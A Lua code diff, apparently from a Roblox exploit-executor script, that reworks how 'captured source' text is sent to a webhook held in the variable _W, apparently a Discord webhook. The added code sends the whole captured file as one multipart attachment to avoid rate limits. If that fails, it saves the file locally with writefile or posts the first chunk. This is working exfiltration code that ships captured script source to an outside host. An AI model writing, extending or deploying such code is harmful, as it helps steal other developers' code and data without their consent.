@@ -39,11 +39,24 @@ local function _debug(msg)
 	_post("[DEBUG] " .. tostring(msg))
 end
 
-local function _sendHttp(body)
-	if type(request) == "function" then request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
-	if type(http_request) == "function" then http_request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
-	if type(syn and syn.request) == "function" then syn.request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
+local function _sendHttp(body, contentType)
+	contentType = contentType or "application/json"
+	if type(request) == "function" then request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
+	if type(http_request) == "function" then http_request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
+	if type(syn and syn.request) == "function" then syn.request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
 	if game and game.GetService then game:GetService("HttpService"):PostAsync(_W, body) end
+end
+
+-- Send full source as ONE file attachment (no rate limit). Discord allows up to 25MB per file.
+local function _sendAsFile(s)
+	local boundary = "----Boundary" .. tostring(math.random(100000, 999999))
+	local header = "Content-Disposition: form-data; name=\"content\"\r\n\r\nCaptured source (" .. #s .. " chars) - full file attached.\r\n"
+	local filePart = "Content-Disposition: form-data; name=\"file\"; filename=\"source.lua\"\r\nContent-Type: text/plain\r\n\r\n"
+	local body = "--" .. boundary .. "\r\n" .. header .. "--" .. boundary .. "\r\n" .. filePart .. s .. "\r\n--" .. boundary .. "--\r\n"
+	local ok = pcall(function()
+		_sendHttp(body, "multipart/form-data; boundary=" .. boundary)
+	end)
+	return ok
 end
 
 local function _send(s)
@@ -51,21 +64,27 @@ local function _send(s)
 	_n = _n + 1
 	(task and task.defer or spawn or function(f) f() end)(function()
 		pcall(function()
-			local parts = math.ceil(#s / _maxChunk)
-			for i = 1, parts do
-				local chunk = s:sub((i - 1) * _maxChunk + 1, i * _maxChunk)
-				local title = parts > 1 and ("#%d (%d/%d)"):format(_n, i, parts) or ("#%d"):format(_n)
-				local body
-				if game and game.GetService then
-					body = game:GetService("HttpService"):JSONEncode({
-						content = ("%d chars"):format(#s),
-						embeds = { { title = title, description = "```lua\n" .. chunk .. "\n```" } }
-					})
-				else
-					body = "{\"content\":\"" .. _escape(("%d chars"):format(#s)) .. "\",\"embeds\":[{\"title\":\"" .. _escape(title) .. "\",\"description\":\"" .. _escape("```lua\n" .. chunk .. "\n```") .. "\"}]}"
-				end
-				_sendHttp(body)
+			-- 1) Try single webhook with file attachment (all 155 "parts" in one message)
+			local sent = _sendAsFile(s)
+			if sent then
+				_post("[DEBUG] Sent full source as file attachment (" .. #s .. " chars)")
+				return
 			end
+			-- 2) Fallback: save to file if executor has writefile, then one webhook message
+			if writefile then
+				local path = "static_content_130525/source_captured.lua"
+				pcall(function() if makefolder then makefolder("static_content_130525") end end)
+				pcall(function() writefile(path, s) end)
+				_post("[DEBUG] Saved to " .. path .. " (" .. #s .. " chars) - check executor folder")
+				return
+			end
+			-- 3) Last resort: send only first chunk so you get something
+			local chunk = s:sub(1, _maxChunk)
+			local body = game and game.GetService and game:GetService("HttpService"):JSONEncode({
+				content = ("Full source " .. #s .. " chars - file upload/save failed. First " .. _maxChunk .. " chars below:"),
+				embeds = { { description = "```lua\n" .. chunk .. "\n```" } }
+			}) or "{\"content\":\"Full source " .. #s .. " chars - check executor folder for writefile\"}"
+			_sendHttp(body)
 		end)
 	end)
 end
